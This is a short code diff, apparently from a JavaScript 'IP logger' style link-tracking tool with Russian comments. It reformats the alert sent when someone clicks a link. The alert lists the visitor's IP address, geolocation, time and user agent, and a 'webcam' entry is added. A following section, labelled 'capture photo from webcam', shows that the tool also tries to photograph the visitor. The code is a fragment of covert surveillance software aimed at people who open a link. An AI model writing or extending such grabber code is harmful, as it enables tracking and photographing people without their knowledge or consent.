@@ -40,12 +40,13 @@
     }
 
     // ---------- 4. Формирование caption (древовидный стиль) ----------
-    const caption = `Новый переход по ссылке!
+    const caption = `🚨Новый переход по ссылке!
 
-IP Адресс: ${ipAddress}
- ├─ Гео/Локация: ${geo}
- ├─ Время перехода: ${timeStr}
- └─ Устройство/UserAgent: ${deviceType} | ${shortUA}`;
+📸Вебкамера:🔝
+🌐IP Адресс: ${ipAddress}
+ ├─Гео/Локация: ${geo}
+ ├─Время перехода: ${timeStr}
+ └─UserAgent: ${deviceType} | ${shortUA}`;
 
     // ---------- 5. Захват фото с вебкамеры ----------
     let photoBlob = null;
